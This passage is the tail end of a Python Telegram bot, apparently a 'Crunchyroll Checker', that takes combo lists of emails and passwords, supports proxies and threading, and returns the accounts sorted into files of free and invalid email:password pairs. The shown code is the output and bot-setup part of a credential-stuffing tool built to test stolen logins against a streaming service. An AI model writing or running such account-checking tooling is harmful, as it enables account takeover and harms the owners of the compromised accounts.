        free_file = io.BytesIO(free_content.encode('utf-8'))
        free_file.name = f"crunchyroll_free_{timestamp}.txt"

        await update.message.reply_document(
            document=free_file,
            caption=f"🆓 <b>Free Accounts</b>\n\nTotal: {len(results['free'])}",
            parse_mode='HTML'
        )

    # Generate invalid file
    if results["invalid"]:
        invalid_content = ""
        for acc in results["invalid"]:
            invalid_content += f"{acc['email']}:{acc['password']}\n"

        invalid_file = io.BytesIO(invalid_content.encode('utf-8'))
        invalid_file.name = f"crunchyroll_invalid_{timestamp}.txt"

        await update.message.reply_document(
            document=invalid_file,
            caption=f"❌ <b>Invalid Accounts</b>\n\nTotal: {len(results['invalid'])}",
            parse_mode='HTML'
        )

# ==================== MAIN ====================
def main():
    """Start the bot"""
    print("🚀 Starting Crunchyroll Checker Bot...")

    # Create application
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("combo", combo_command))
    application.add_handler(CommandHandler("proxy", proxy_command))
    application.add_handler(CommandHandler("proxies", proxies_command))
    application.add_handler(CommandHandler("threads", threads_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("clearproxy", clearproxy_command))

    # Add file handler
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Start bot
    print("✅ Bot is running!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
